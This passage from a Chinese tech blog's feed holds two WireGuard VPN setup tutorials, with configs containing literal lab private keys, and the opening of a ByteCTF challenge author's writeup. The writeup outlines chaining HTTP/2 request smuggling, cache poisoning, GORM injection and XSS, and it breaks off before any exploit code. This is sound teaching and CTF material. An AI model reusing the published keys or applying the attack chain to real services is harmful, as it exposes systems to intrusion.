points="701.5247,-75.3537 694.9757,-67.0253 694.9016,-77.6199 701.5247,-75.3537"/></g><!-- WG --><g id="node11" class="node"><title>WG</title><polygon fill="none" stroke="#ff0000" points="531.399,-128.1545 535.6969,-128.3152 539.9504,-128.5557 544.1421,-128.8753 548.255,-129.2731 552.2726,-129.7482 556.179,-130.2991 559.9591,-130.9243 563.5986,-131.6222 567.0837,-132.3908 570.4021,-133.228 573.5422,-134.1315 576.4935,-135.0989 579.2467,-136.1275 581.7936,-137.2145 584.1272,-138.3568 586.2417,-139.5515 588.1327,-140.7951 589.7967,-142.0843 591.2317,-143.4155 592.4367,-144.7852 593.412,-146.1895 594.1589,-147.6246 594.6799,-149.0866 594.9783,-150.5714 595.0586,-152.075 594.926,-153.5933 594.5867,-155.122 594.0473,-156.6571 593.3155,-158.1943 592.3992,-159.7294 591.3068,-161.2582 590.0474,-162.7765 588.6299,-164.2801 587.0639,-165.7649 585.3588,-167.2269 583.5242,-168.662 581.5695,-170.0663 579.5042,-171.4359 577.3373,-172.7672 575.078,-174.0564 572.7347,-175.3 570.3159,-176.4946 567.8293,-177.637 565.2824,-178.7239 562.6822,-179.7525 560.0352,-180.7199 557.3475,-181.6235 554.6244,-182.4607 551.871,-183.2293 549.0919,-183.9272 546.2912,-184.5524 543.4725,-185.1033 540.639,-185.5783 537.7937,-185.9762 534.9392,-186.2958 532.0777,-186.5362 529.2115,-186.6969 526.3424,-186.7774 523.4724,-186.7774 520.6034,-186.6969 517.7371,-186.5362 514.8757,-186.2958 512.0211,-185.9762 509.1758,-185.5783 506.3424,-185.1033 503.5236,-184.5524 500.7229,-183.9272 497.9438,-183.2293 495.1905,-182.4607 492.4674,-181.6235 489.7796,-180.7199 487.1326,-179.7525 484.5324,-178.7239 481.9856,-177.637 479.499,-176.4946 477.0801,-175.3 474.7369,-174.0564 472.4775,-172.7672 470.3107,-171.4359 468.2453,-170.0663 466.2906,-168.662 464.456,-167.2269 462.7509,-165.7649 461.1849,-164.2801 459.7675,-162.7765 458.508,-161.2582 457.4157,-159.7294 456.4993,-158.1943 455.7675,-156.6571 455.2282,-155.122 454.8888,-153.5933 454.7562,-152.075 454.8365,-150.5714 455.135,-149.0866 455.6559,-147.6246 456.4028,-146.1895 457.3781,-144.7852 458.5832,-143.4155 460.0182,-142.0843 461.6822,-140.7951 463.5731,-139.5515 465.6877,-138.3568 468.0213,-137.2145 470.5681,-136.1275 473.3213,-135.0989 476.2726,-134.1315 479.4127,-133.228 482.7311,-132.3908 486.2163,-131.6222 489.8557,-130.9243 493.6358,-130.2991 497.5423,-129.7482 501.5599,-129.2731 505.6728,-128.8753 509.8644,-128.5557 514.1179,-128.3152 518.4159,-128.1545 522.7406,-128.0741 527.0743,-128.0741 531.399,-128.1545"/><text text-anchor="middle" x="524.9074" y="-161.6257" font-family="Times,serif" font-size="14.00" fill="#ff0000">WG NAT</text><text text-anchor="middle" x="524.9074" y="-144.8257" font-family="Times,serif" font-size="14.00" fill="#ff0000">100.64.0.0/24</text></g><!-- WG&#45;&gt;Master --><g id="edge9" class="edge"><title>WG&#45;&gt;Master</title><path fill="none" stroke="#ff0000" d="M497.3073,-129.6341C480.9663,-113.1797 460.0677,-92.136 442.3795,-74.3252"/><polygon fill="#ff0000" stroke="#ff0000" points="444.5481,-71.5419 435.0181,-66.9127 439.5813,-76.4745 444.5481,-71.5419"/><text text-anchor="middle" x="495.1739" y="-97.4" font-family="Times,serif" font-size="14.00" fill="#ff0000">Server</text></g><!-- WG&#45;&gt;OpenwrtA --><g id="edge10" class="edge"><title>WG&#45;&gt;OpenwrtA</title><path fill="none" stroke="#ff0000" d="M471.5795,-135.6371C434.599,-120.004 384.5318,-97.7898 341.9074,-75.2 341.7151,-75.0981 341.5225,-74.9957 341.3297,-74.8931"/><polygon fill="#ff0000" stroke="#ff0000" points="343.0028,-71.8189 332.5537,-70.0674 339.6299,-77.9527 343.0028,-71.8189"/></g><!-- WG&#45;&gt;OpenwrtB --><g id="edge11" class="edge"><title>WG&#45;&gt;OpenwrtB</title><path fill="none" stroke="#ff0000" d="M526.3906,-127.8059C527.0273,-115.0907 527.7876,-99.9052 528.5013,-85.6525"/><polygon fill="#ff0000" stroke="#ff0000" points="532.0057,-85.6505 529.0103,-75.4879 525.0145,-85.3003 532.0057,-85.6505"/></g><!-- WG&#45;&gt;UbuntuC --><g id="edge12" class="edge"><title>WG&#45;&gt;UbuntuC</title><path fill="none" stroke="#ff0000" d="M560.4166,-130.8325C583.1631,-113.7974 612.9459,-91.4927 637.6773,-72.9711"/><polygon fill="#ff0000" stroke="#ff0000" points="639.9472,-75.6439 645.8534,-66.848 635.7511,-70.041 639.9472,-75.6439"/></g></g></svg>                    <div style="text-align: center;margin: -8px 0 10px;color: #858585;"></div>                    </div>                                    </div><h1 id="构建测试环境"><a href="#构建测试环境" class="headerlink" title="构建测试环境"></a>构建测试环境</h1><p>Master 和 Ubuntu 两台主机，可以按照之前教程进行配置。Openwrt 需要安装 <code>wireguard-tools</code><br>使用VMware 的虚拟网络进行组网</p><h2 id="配置-Openwrt-LAN"><a href="#配置-Openwrt-LAN" class="headerlink" title="配置 Openwrt LAN"></a>配置 Openwrt LAN</h2><p>分配给 Openwrt A&#x2F;B 分别是 <code>100.64.1.0/24</code>, <code>100.64.2.0/24</code> 需要通过修改 接口LAN 相关配置</p><h2 id="配置-Wireguard"><a href="#配置-Wireguard" class="headerlink" title="配置 Wireguard"></a>配置 Wireguard</h2><p>生成相应密钥对</p><h3 id="Master"><a href="#Master" class="headerlink" title="Master"></a>Master</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[Interface]</span><br><span class="line">PrivateKey = ELjtwIswOI/qSV6oDkRbOdaZt+CuLWSWu3rY1Wh0XUU=</span><br><span class="line"></span><br><span class="line">Address = 100.64.0.1/24</span><br><span class="line">SaveConfig = true</span><br><span class="line"></span><br><span class="line">PostUp = iptables -A FORWARD -i %i -j ACCEPT; iptables -A FORWARD -o %i -j ACCEPT; iptables -t nat -A POSTROUTING -o ens33 -j MASQUERADE; ip6tables -A FORWARD -i %i -j ACCEPT; ip6tables -A FORWARD -o %i -j ACCEPT; ip6tables -t nat -A POSTROUTING -o ens33 -j MASQUERADE</span><br><span class="line">PostDown = iptables -D FORWARD -i %i -j ACCEPT; iptables -D FORWARD -o %i -j ACCEPT; iptables -t nat -D POSTROUTING -o ens33 -j MASQUERADE; ip6tables -D FORWARD -i %i -j ACCEPT; ip6tables -D FORWARD -o %i -j ACCEPT; ip6tables -t nat -D POSTROUTING -o ens33 -j MASQUERADE</span><br><span class="line"></span><br><span class="line">ListenPort = 65535</span><br><span class="line"></span><br><span class="line">[Peer]</span><br><span class="line">PublicKey = YUMWodweSGW3S8kY45xOeCZHX0LwNUekDTs7fYM09T0=</span><br><span class="line">AllowedIPs = 100.64.0.2/32</span><br><span class="line">[Peer]</span><br><span class="line">PublicKey = Nn4Z/TSRHrbtp2z0YC09S88Lm0MBtiZeTlAhtZ4AJwI=</span><br><span class="line">AllowedIPs = 100.64.0.3/32</span><br><span class="line">[Peer]</span><br><span class="line">PublicKey = 2g83ZgKl56O/swhR6vHaiMg5TBiKhkN5R71qEsbpNhA=</span><br><span class="line">AllowedIPs = 100.64.0.4/32</span><br></pre></td></tr></table></figure><h3 id="Openwrt-A"><a href="#Openwrt-A" class="headerlink" title="Openwrt A"></a>Openwrt A</h3><p>在 <code>/etc/config/network</code> 最后添加配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">config interface &#x27;link_main&#x27;</span><br><span class="line">        option proto &#x27;wireguard&#x27;</span><br><span class="line">        option private_key &#x27;gNAl0GGk6zJr6IVJjaDAdJvgOAWRss2m3fLL6PCpl38=&#x27;</span><br><span class="line">        list addresses &#x27;100.64.0.2/32&#x27;</span><br><span class="line"></span><br><span class="line">config wireguard_link_main &#x27;main&#x27;</span><br><span class="line">        option public_key &#x27;/8LTHNe886/h8IxhjMdbXJyYHlSQQAuIFXtZtRBdGH0=&#x27;</span><br><span class="line">        option endpoint_host &#x27;192.168.234.128&#x27;</span><br><span class="line">        option endpoint_port &#x27;65535&#x27;</span><br><span class="line">        option persistent_keepalive &#x27;25&#x27;</span><br><span class="line">        option route_allowed_ips &#x27;1&#x27;</span><br><span class="line">        list allowed_ips &#x27;100.64.0.0/24&#x27;</span><br></pre></td></tr></table></figure><p>重启网络</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/network restart</span><br></pre></td></tr></table></figure><h3 id="Openwrt-B"><a href="#Openwrt-B" class="headerlink" title="Openwrt B"></a>Openwrt B</h3><p>同上操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">config interface &#x27;link_main&#x27;</span><br><span class="line">        option proto &#x27;wireguard&#x27;</span><br><span class="line">        option private_key &#x27;8PGe5bj8/1+t632qIVrXH4qqRH1tuKvvlTKCdymyWW8=&#x27;</span><br><span class="line">        list addresses &#x27;100.64.0.3/32&#x27;</span><br><span class="line"></span><br><span class="line">config wireguard_link_main &#x27;main&#x27;</span><br><span class="line">        option public_key &#x27;/8LTHNe886/h8IxhjMdbXJyYHlSQQAuIFXtZtRBdGH0=&#x27;</span><br><span class="line">        option endpoint_host &#x27;192.168.234.128&#x27;</span><br><span class="line">        option endpoint_port &#x27;65535&#x27;</span><br><span class="line">        option persistent_keepalive &#x27;25&#x27;</span><br><span class="line">        option route_allowed_ips &#x27;1&#x27;</span><br><span class="line">        list allowed_ips &#x27;100.64.0.0/24&#x27;</span><br></pre></td></tr></table></figure><h1 id="网络互通"><a href="#网络互通" class="headerlink" title="网络互通"></a>网络互通</h1><h2 id="Openwrt-间"><a href="#Openwrt-间" class="headerlink" title="Openwrt 间"></a>Openwrt 间</h2>]]></content>
    
    
    <summary type="html">&lt;p&gt;随着上一篇 &lt;a href=&quot;/2022/02/wireguard-tutorial/&quot;&gt;WireGuard 简易上手&lt;/a&gt;，已经对 WireGuard 有了一定了解。&lt;br&gt;接着我们可以通过 WireGuard 进行进阶的组网操作。&lt;/p&gt;</summary>
    
    
    
    <category term="尝尝鲜" scheme="https://blog.kur4ge.com/categories/%E5%B0%9D%E5%B0%9D%E9%B2%9C/"/>
    
    
    <category term="WireGuard" scheme="https://blog.kur4ge.com/tags/WireGuard/"/>
    
    <category term="Network" scheme="https://blog.kur4ge.com/tags/Network/"/>
    
  </entry>
  
  <entry>
    <title>WireGuard 简易上手</title>
    <link href="https://blog.kur4ge.com/2022/02/wireguard-tutorial/"/>
    <id>https://blog.kur4ge.com/2022/02/wireguard-tutorial/</id>
    <published>2022-02-10T23:46:00.000Z</published>
    <updated>2022-02-10T15:46:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>其实，你既然搜到这个文章，也说明你已经对WireGuard有所了解。<br>简简单单介绍一下，<a href="https://www.wireguard.com/">WireGuard</a> 是一个简单部署+快速的VPN，它的目标是比 IPsec 更快、更简单、更精简和更有用，并比 OpenVPN 性能要高得多。 WireGuard 能适用于许多不同的环境。现在它是跨平台的（Windows、macOS、BSD、iOS、Android）VPN。</p><h1 id="部署目标"><a href="#部署目标" class="headerlink" title="部署目标"></a>部署目标</h1><p>既然是简易上手，当然部署一套内网是最容易说明的。<br>我们的目标是通过部署实现，让三台异地主机能在同一个内网中互相访问！</p><div align=center><p><img src="https://kur4ge.oss-accelerate.aliyuncs.com/2022/02/wireguard-tutorial/image-20220210235849002.png" alt="网络拓扑图"></p></div><span id="more"></span><h2 id="安装WireGuard"><a href="#安装WireGuard" class="headerlink" title="安装WireGuard"></a>安装WireGuard</h2><p><a href="https://www.wireguard.com/install/">官方安装文档 WireGuard Install</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Ubuntu 安装方式</span></span><br><span class="line">add-apt-repository ppa:wireguard/wireguard</span><br><span class="line">apt-get update</span><br><span class="line">apt-get install linux-headers-$(<span class="built_in">uname</span> -r)</span><br><span class="line">apt-get install wireguard</span><br><span class="line"></span><br><span class="line"><span class="comment"># Debian 安装方式</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;deb http://deb.debian.org/debian/ unstable main&quot;</span> &gt; /etc/apt/sources.list.d/unstable.list</span><br><span class="line">apt-get update</span><br><span class="line">apt-get install linux-headers-$(<span class="built_in">uname</span> -r)</span><br><span class="line">apt-get install wireguard</span><br></pre></td></tr></table></figure><p><code>Windows</code> 用户直接下载<a href="https://download.wireguard.com/windows-client/wireguard-installer.exe">客户端</a>安装；<br><code>macOS</code> 用户可以登入非国区账号进行下载</p><h2 id="配置Server端"><a href="#配置Server端" class="headerlink" title="配置Server端"></a>配置Server端</h2><p>Server 端建议在 <code>Linux</code> 部署，<code>Windows</code> 网络转发（内网通信）坑很大。</p><h3 id="1-启用IP转发（这样内网用户才能互相通信）"><a href="#1-启用IP转发（这样内网用户才能互相通信）" class="headerlink" title="1. 启用IP转发（这样内网用户才能互相通信）"></a>1. 启用IP转发（这样内网用户才能互相通信）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure><p>如果想永久保留配置，可以修改<code>/etc/sysctl.conf</code>文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将 net.ipv4.ip_forward=0 改为 net.ipv4.ip_forward=1</span><br></pre></td></tr></table></figure><h3 id="2-生成公私钥"><a href="#2-生成公私钥" class="headerlink" title="2. 生成公私钥"></a>2. 生成公私钥</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wg genkey | <span class="built_in">tee</span> privatekey | wg pubkey &gt; publickey</span><br></pre></td></tr></table></figure><p>操作之后，你的目录就会有两个文件。注意保护好私钥哦~</p><h3 id="3-配置文件"><a href="#3-配置文件" class="headerlink" title="3. 配置文件"></a>3. 配置文件</h3><p>新建<code>/etc/wireguard/wg0.conf</code>并贴入以下内容。<br>记得要按需修改。</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[Interface]</span></span><br><span class="line"><span class="comment"># 服务器私钥</span></span><br><span class="line"><span class="attr">PrivateKey</span> = server_private_key</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绑定地址</span></span><br><span class="line"><span class="attr">Address</span> = <span class="number">100.64</span>.<span class="number">0.1</span>/<span class="number">24</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 是否保存配置, 可以在运行中通过命令行添加新客户端, 并保存到此配置</span></span><br><span class="line"><span class="attr">SaveConfig</span> = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 自动脚本, 这里就要把 ens3 替换成之前记下的外网网卡名称 , wg0 是等下创建的虚拟网卡名称</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置防火墙规则 让客户端可以可以通过ens3网卡上网，如果不想client通过server上网可以注释掉</span></span><br><span class="line"><span class="comment"># %i 是 表示当前INTERFACE的配置名 </span></span><br><span class="line"><span class="comment"># 一共可以设定 PreUp，PostUp，PreDown，PostDown 4个事件</span></span><br><span class="line"><span class="attr">PostUp</span> = iptables -A FORWARD -i %i -j ACCEPT<span class="comment">; iptables -A FORWARD -o %i -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE; ip6tables -A FORWARD -i %i -j ACCEPT; ip6tables -A FORWARD -o %i -j ACCEPT; ip6tables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</span></span><br><span class="line"><span class="comment"># 关闭动作, 操作同上</span></span><br><span class="line"><span class="attr">PostDown</span> = iptables -D FORWARD -i %i -j ACCEPT<span class="comment">; iptables -D FORWARD -o %i -j ACCEPT; iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE; ip6tables -D FORWARD -i %i -j ACCEPT; ip6tables -D FORWARD -o %i -j ACCEPT; ip6tables -t nat -D POSTROUTING -o eth0 -j MASQUERADE</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 监听端口</span></span><br><span class="line"><span class="attr">ListenPort</span> = <span class="number">65535</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 客户端配置</span></span><br><span class="line"><span class="section">[Peer]</span></span><br><span class="line"><span class="comment"># 客户端公钥</span></span><br><span class="line"><span class="attr">PublicKey</span> = client1_public_key</span><br><span class="line"></span><br><span class="line"><span class="comment"># 允许客户端获取的地址</span></span><br><span class="line"><span class="attr">AllowedIPs</span> = <span class="number">100.64</span>.<span class="number">0.2</span>/<span class="number">32</span></span><br></pre></td></tr></table></figure><h3 id="4-启动服务"><a href="#4-启动服务" class="headerlink" title="4. 启动服务"></a>4. 启动服务</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wg-quick up wg0</span><br></pre></td></tr></table></figure><p>运行之后，你就能看到 ListenPort 对应的UDP端口已经打开。<br>如果启动失败，出现<code>RTNETLINK answers: Operation not supported</code> 尝试重启主机或者升级系统。</p><h2 id="配置客户端"><a href="#配置客户端" class="headerlink" title="配置客户端"></a>配置客户端</h2><p>按照服务端的方式生成客户端的共私钥</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[Interface]</span></span><br><span class="line">    <span class="attr">PrivateKey</span> = client1_privete_key</span><br><span class="line">    <span class="attr">Address</span> = <span class="number">100.64</span>.<span class="number">0.2</span>/<span class="number">32</span></span><br><span class="line">    <span class="attr">DNS</span> = <span class="number">8.8</span>.<span class="number">8.8</span></span><br><span class="line"><span class="section">[Peer]</span></span><br><span class="line">    <span class="attr">PublicKey</span> = server_public_key</span><br><span class="line">    <span class="attr">AllowedIPs</span> = <span class="number">100.64</span>.<span class="number">0.0</span>/<span class="number">24</span></span><br><span class="line">    <span class="attr">Endpoint</span> = server_ip:port</span><br><span class="line">    <span class="attr">PersistentKeepalive</span> = <span class="number">25</span></span><br></pre></td></tr></table></figure><p>Address 要和 服务端配置相同 <code>/32</code> 代表固定IP<br>DNS 会修改全局DNS配置。如果没有特殊要求可以不填。（8.8.8.8在国内还是慢的，详情见 <a href="/2021/11/Why-is-Baidu-so-slow/">为什么我的百度访问这么慢？？？</a>）<br>AllowedIPs 允许代理的网段，有几个配置可以自行使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AllowedIPs = 100.64.0.0/24 # 仅内网访问</span><br><span class="line">AllowedIPs = 0.0.0.0/24    # 全网访问 需要服务端开启网络转发</span><br></pre></td></tr></table></figure><h1 id="常用命令速查"><a href="#常用命令速查" class="headerlink" title="常用命令速查"></a>常用命令速查</h1><h2 id="启-x2F-停"><a href="#启-x2F-停" class="headerlink" title="启&#x2F;停"></a>启&#x2F;停</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wg-quick up wg0</span><br><span class="line">wg-quick down wg0</span><br></pre></td></tr></table></figure><h2 id="自启动服务"><a href="#自启动服务" class="headerlink" title="自启动服务"></a>自启动服务</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> wg-quick@wg0</span><br></pre></td></tr></table></figure><h2 id="增-x2F-删用户"><a href="#增-x2F-删用户" class="headerlink" title="增&#x2F;删用户"></a>增&#x2F;删用户</h2><p>直接在conf增加一个[peer]就可以，或者使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wg <span class="built_in">set</span> wg0 peer client_public_key allowed-ips 100.64.0.2/32</span><br><span class="line">wg-quick save wg0</span><br><span class="line">wg <span class="built_in">set</span> wg0 peer client_public_key remove</span><br><span class="line">wg-quick save wg0</span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://sseen.github.io/WireGuard%E9%85%8D%E7%BD%AE/">WireGuard配置</a></p><p><a href="https://www.readmorejoy.com/2020/02/debian10-wireguard-vpn/">Debian10 Wireguard VPN</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;其实，你既然搜到这个文章，也说明你已经对WireGuard有所了解。&lt;br&gt;简简单单介绍一下，&lt;a href=&quot;https://www.wireguard.com/&quot;&gt;WireGuard&lt;/a&gt; 是一个简单部署+快速的VPN，它的目标是比 IPsec 更快、更简单、更精简和更有用，并比 OpenVPN 性能要高得多。 WireGuard 能适用于许多不同的环境。现在它是跨平台的（Windows、macOS、BSD、iOS、Android）VPN。&lt;/p&gt;
&lt;h1 id=&quot;部署目标&quot;&gt;&lt;a href=&quot;#部署目标&quot; class=&quot;headerlink&quot; title=&quot;部署目标&quot;&gt;&lt;/a&gt;部署目标&lt;/h1&gt;&lt;p&gt;既然是简易上手，当然部署一套内网是最容易说明的。&lt;br&gt;我们的目标是通过部署实现，让三台异地主机能在同一个内网中互相访问！&lt;/p&gt;
&lt;div align=center&gt;

&lt;p&gt;&lt;img src=&quot;https://kur4ge.oss-accelerate.aliyuncs.com/2022/02/wireguard-tutorial/image-20220210235849002.png&quot; alt=&quot;网络拓扑图&quot;&gt;&lt;/p&gt;
&lt;/div&gt;</summary>
    
    
    
    <category term="尝尝鲜" scheme="https://blog.kur4ge.com/categories/%E5%B0%9D%E5%B0%9D%E9%B2%9C/"/>
    
    
    <category term="WireGuard" scheme="https://blog.kur4ge.com/tags/WireGuard/"/>
    
    <category term="tutorial" scheme="https://blog.kur4ge.com/tags/tutorial/"/>
    
  </entry>
  
  <entry>
    <title>A-ginx 出题思路与题解</title>
    <link href="https://blog.kur4ge.com/2021/12/A-ginx-idea-and-writeup/"/>
    <id>https://blog.kur4ge.com/2021/12/A-ginx-idea-and-writeup/</id>
    <published>2021-12-13T21:37:32.000Z</published>
    <updated>2022-02-10T13:37:32.000Z</updated>
    
    <content type="html"><![CDATA[<p>在本次ByteCTF的初赛和决赛中，A-ginx都是比较少解出的题目（是我脑洞太大了吗？感觉不难呀）</p><p>这里我来谈谈我出A-ginx的思路。</p><p>一道题目，需要有若干个漏洞结合而成。我认为一个好的题目，不能随意的把各个漏洞点强制的嵌套起来，应该是符合逻辑，有所取舍的。</p><div align=center><p><img src="https://kur4ge.oss-accelerate.aliyuncs.com/2021/12/A-ginx-idea-and-writeup/-163940277131011.gif"></p></div><span id="more"></span><h2 id="检查手牌"><a href="#检查手牌" class="headerlink" title="检查手牌"></a>检查手牌</h2><p>那么，就来整理一下，我出题时手上拥有的漏洞点。</p><h3 id="1-HTTP-x2F-2"><a href="#1-HTTP-x2F-2" class="headerlink" title="1. HTTP&#x2F;2"></a>1. HTTP&#x2F;2</h3><p>有些CTFer不喜欢升级手头的工具，总认为v1.7(最早发布于2016年)的Burp Suite才是经典。但是随着Burp不断更新迭代，老版本早因各种原因需要退出历史。比如老版本使用旧的Chromium，随时可能被日; 老版本Burp Suite 就不支持HTTP&#x2F;2 等等</p><p>所以，本题的主体目标就决定为：一定要使用HTTP&#x2F;2，强制使用老版本的CTFer升级Burp Suite。</p><div align=center><p><img src="https://kur4ge.oss-accelerate.aliyuncs.com/2021/12/A-ginx-idea-and-writeup/-16394027713091.gif?x-oss-process=style/w200"></p></div><p>当然出题不能无缘无故来使用HTTP&#x2F;2，一定要有什么漏洞点才能加到题目中。通过研读HTTP&#x2F;2的RFC文档，发现协议中并没有可以造成漏洞的问题，但协议没有，使用协议的上下游有没有呢？这篇文章给了我启发<a href="https://portswigger.net/research/http2">HTTP&#x2F;2: The Sequel is Always Worse</a>，虽然HTTP&#x2F;2协议没有问题，但是在转化为HTTP&#x2F;1.1会产生一些安全风险。</p><p>目前业界也较多采用使用支持HTTP&#x2F;2的反代服务（如Nginx）来做前端的负载均衡，后面通过HTTP&#x2F;1.1进行反向代理到真正的业务服务中。</p><h3 id="2-架构带来的风险"><a href="#2-架构带来的风险" class="headerlink" title="2. 架构带来的风险"></a>2. 架构带来的风险</h3><p>所以整道题目的架构也浮现了：前端(反向代理) –&gt; 后端(业务逻辑)</p><p>那么 这种架构能带来什么安全问题呢?</p><pre><code>a. 请求走私b. WAF绕过c. 真实IP欺骗d. 缓存攻击</code></pre><h3 id="3-GORM-Where-Key注入"><a href="#3-GORM-Where-Key注入" class="headerlink" title="3. GORM Where Key注入"></a>3. GORM Where Key注入</h3><p>在旧版本中，GORM对于列名的未过滤反引号，可以造成逃逸，从而导致注入。</p><h3 id="4-简简单单来个XSS"><a href="#4-简简单单来个XSS" class="headerlink" title="4. 简简单单来个XSS"></a>4. 简简单单来个XSS</h3><p>前端使是 <a href="https://github.com/Fungx/Asoul-ICU">Asoul-ICU小作文库</a> 修改而来，原生代码中即存在<code>dangerouslySetInnerHTML</code>的使用，所以简单来说就是一个XSS。</p><h2 id="整理手牌"><a href="#整理手牌" class="headerlink" title="整理手牌"></a>整理手牌</h2><p>这些漏洞点本来是打算出在一道题中，但是发现点太多，最终拆成两道题。（桀桀，牌太多了）</p><p>初赛：请求走私 + 缓存攻击 + XSS</p><p>决赛：请求走私 + GORM注入 + 绕过WAF + 真实IP欺骗</p><blockquote><p>这也是题目描述<code>This is similar to a-ginx, but not very similar!</code>的意义。</p></blockquote><h1 id="题目源码与环境"><a href="#题目源码与环境" class="headerlink" title="题目源码与环境"></a>题目源码与环境</h1><p>题目的源码和环境现已全部开源，欢迎大家指教～</p><ul><li><p><a href="https://github.com/kur4ge/my-ctf-challenges/tree/main/ByteCTF2021/A-ginx">A-ginx 源码与环境</a></p></li><li><p><a href="https://github.com/kur4ge/my-ctf-challenges/tree/main/ByteCTF2021/A-ginx2">A-ginx2  源码与环境</a></p></li></ul><div align=center><p><img src="https://kur4ge.oss-accelerate.aliyuncs.com/2021/12/A-ginx-idea-and-writeup/-16394027713092.gif"></p></div><h1 id="解题思路和EXP"><a href="#解题思路和EXP" class="headerlink" title="解题思路和EXP"></a>解题思路和EXP</h1><p>初赛提供了环境，二进制程序，数据库结构。这大部分都和A-ginx2是相似的。</p><h2 id="通用的设定"><a href="#通用的设定" class="headerlink" title="通用的设定"></a>通用的设定</h2><h3 id="Trace-Id"><a href="#Trace-Id" class="headerlink" title="Trace-Id"></a>Trace-Id</h3><p>包括现实很多地方都会存在类似于<code>Trace-Id</code> 的东西，它们只有一个目的，追踪请求的流转。在本题中，你可以通过<code>Trace-Id</code> 来判断这个请求是否到达到<code>backend</code>。</p><h2 id="A-ginx"><a href="#A-ginx" class="headerlink" title="A-ginx"></a>A-ginx</h2><p><a href="https://bytectf.feishu.cn/docs/doccnq7Z5hqRBMvrmpRQMAGEK4e#rDVUaU">2021 ByteCTF 初赛部分题目官方Writeup</a> </p><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>既然提供了bot,那必然有XSS。不管通过那些途径，你可以找到两个XSS点</p><ol><li><p>POST型XSS点 <code>/v/articles/preview</code></p></li><li><p>展示article中的 <code>htmlContent</code> 是另一个XSS点</p></li></ol><p>但是这两个点都不能独立的完成XSS，一个是POST型无法触发，另一个因为输入中有<code>HTMLSanitize</code>来进行过滤。</p><h3 id="缓存服务"><a href="#缓存服务" class="headerlink" 